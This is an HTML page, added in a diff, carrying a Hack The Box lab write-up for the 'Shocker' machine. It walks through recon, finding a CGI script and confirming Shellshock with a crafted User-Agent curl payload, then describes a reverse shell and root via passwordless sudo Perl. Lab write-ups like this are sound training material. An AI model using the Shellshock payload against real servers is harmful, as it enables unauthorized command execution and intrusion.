@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shocker // Lab Report // crimson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow"></div>
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<header class="site">
+  <nav>
+    <div class="logo glitch">~/<span>crimson</span>▋</div>
+    <div class="navlinks">
+      <a href="../index.html">Home</a>
+      <a href="../blog.html">Blog</a>
+      <a href="../reports.html" class="active">Lab Reports</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../aboutme.html">About Me</a>
+    </div>
+    <div class="nav-status"><span class="status-dot"></span>online</div>
+  </nav>
+</header>
+
+<main>
+
+  <section class="page-head reveal visible" style="border-bottom:none;padding-bottom:0;">
+    <a href="../reports.html" class="back-link">← ls reports/</a>
+    <div class="eyebrow scramble">cat shocker.md</div>
+    <h1 class="page-title scramble glitch glow-heading">Shocker</h1>
+    <div class="writeup-meta">
+      <span class="tag">HTB</span><span class="tag diff easy">Easy</span><span class="tag">Enumeration</span><span class="tag">RCE</span><span class="tag">Linux PrivEsc</span>
+    </div>
+    <p class="writeup-summary">Shocker is an easy Linux machine where a CGI script is vulnerable to Shellshock, allowing remote command execution and a shell as shelly. A passwordless sudo permission for Perl to execute a root shell directly.</p>
+    <div class="writeup-date">Solved: July 30, 2026</div>
+  </section>
+
+  <section class="reveal visible">
+    <div class="writeup-body">
+      <h2>Recon</h2>
+      <p>Started with a basic Nmap scan:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">nmap</div></div><div class="term-body"><div><span class="prompt">$</span> nmap -sC -sV -Pn 10.129.15.53</div></div></div>
+      <p>The scan identified two accessible services:</p>
+      <table class="writeup-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>80</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr><tr><td>2222</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</td></tr></tbody></table>
+      <p>The target is running an older Ubuntu Linux installation with Apache on port 80 and SSH exposed on the non-standard port <code>2222</code>.</p>
+      <h2>Enumeration</h2>
+      <h3>HTTP - TCP 80</h3>
+      <p>Visiting the website did not reveal anything particularly useful. The page had no title and contained very little content.</p>
+      <p>We then used Gobuster to enumerate directories:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">gobuster</div></div><div class="term-body"><div><span class="prompt">$</span> gobuster dir -u http://10.129.15.53/ -w dirb.txt</div></div></div>
+      <p>Among the discovered paths was:</p>
+      <div class="output-block">/cgi-bin/</div>
+      <p>The <code>/cgi-bin/</code> directory was particularly interesting because CGI scripts can be affected by Shellshock when they invoke Bash.</p>
+      <p>We enumerated the directory further:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">gobuster</div></div><div class="term-body"><div><span class="prompt">$</span> gobuster dir -u http://10.129.15.53/cgi-bin/ -w cgibin.txt</div></div></div>
+      <p>This revealed:</p>
+      <div class="output-block">/user.sh</div>
+      <p>Requesting the script showed:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">curl</div></div><div class="term-body"><div><span class="prompt">$</span> curl http://10.129.15.53/cgi-bin/user.sh</div></div></div>
+      <p>The response was:</p>
+      <div class="output-block">Content-Type: text/plain
+
+Just an uptime test script
+01:47:41 up 3 min, 0 users, load average: 0.03, 0.07, 0.03</div>
+      <p>The script executes an <code>uptime</code> command, making it a potential candidate for Shellshock testing.</p>
+      <h3>Shellshock</h3>
+      <p>Shellshock is a Bash vulnerability that can allow arbitrary commands to be executed when specially crafted environment variables are passed to a vulnerable CGI script.</p>
+      <p>We tested whether the CGI script was vulnerable by sending a crafted <code>User-Agent</code> header:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">curl</div></div><div class="term-body"><div><span class="prompt">$</span> curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo Vulnerable!'" \</div><div><span class="prompt">$</span> http://10.129.15.53/cgi-bin/user.sh</div></div></div>
+      <p>The server returned:</p>
+      <div class="output-block">Vulnerable!</div>
+      <p>This confirmed that the CGI script was vulnerable to Shellshock.</p>
+      <h2>Initial Access</h2>
+      <p>With command execution confirmed, we used the Shellshock vulnerability to obtain a shell as the <code>shelly</code> user.</p>
+      <p>A reverse shell was established through the vulnerable CGI script.</p>
+      <p>Once connected, we verified the account:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">whoami</div></div><div class="term-body"><div><span class="prompt">$</span> whoami</div></div></div>
+      <div class="output-block">shelly</div>
+      <p>We then retrieved the user flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat /home/shelly/user.txt</div></div></div>
+      <div class="output-block">c271a2eb0eae937c681a2cc99f0de25f</div>
+      <p>This confirmed successful user-level access.</p>
+      <h2>Privilege Escalation</h2>
+      <p>After obtaining access as <code>shelly</code>, we checked the user's sudo permissions:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">sudo</div></div><div class="term-body"><div><span class="prompt">$</span> sudo -l</div></div></div>
+      <p>The important entry showed that <code>shelly</code> could execute Perl as <code>root</code> without a password:</p>
+      <div class="output-block">(root) NOPASSWD: /usr/bin/perl</div>
+      <p>This was a straightforward sudo misconfiguration because Perl can execute arbitrary commands.</p>
+      <h2>Root</h2>
+      <p>We used the permitted Perl binary to spawn a shell with root privileges.</p>
+      <p>After obtaining the elevated shell, we verified our privileges:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">id</div></div><div class="term-body"><div><span class="prompt">$</span> id</div></div></div>
+      <p>The shell was running as <code>root</code>.</p>
+      <p>We then retrieved the root flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat /root/root.txt</div></div></div>
+      <div class="output-block">6012f3ded1cd5ca13619f356f1bd5172</div>
+      <p>The machine was fully compromised.</p>
+      <h2>Key Takeaways</h2>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate CGI directories.</span> The <code>/cgi-bin/</code> directory revealed a script that was not obvious from the main webpage.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Look closely at CGI scripts.</span> The <code>user.sh</code> script executed through the web server and was vulnerable to Shellshock.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Test unusual web technologies for known vulnerabilities.</span> The Apache version itself was not the main attack path; the underlying Bash/CGI configuration was.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Always run <code>sudo -l</code> after obtaining a shell.</span> The <code>shelly</code> account had passwordless access to <code>/usr/bin/perl</code>.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Sudo permissions can provide direct root access.</span> The Perl permission eliminated the need for a more complicated privilege-escalation technique.</li></ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site" style="padding-top:0;">
+  <div class="foot-bottom" style="max-width:1100px;margin:0 auto;padding:24px;border-top:1px solid var(--border);">
+    <div>crimson © 2026</div>
+    <div><a href="../reports.html" style="color:var(--text-dim);">← back to Lab Reports</a></div>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
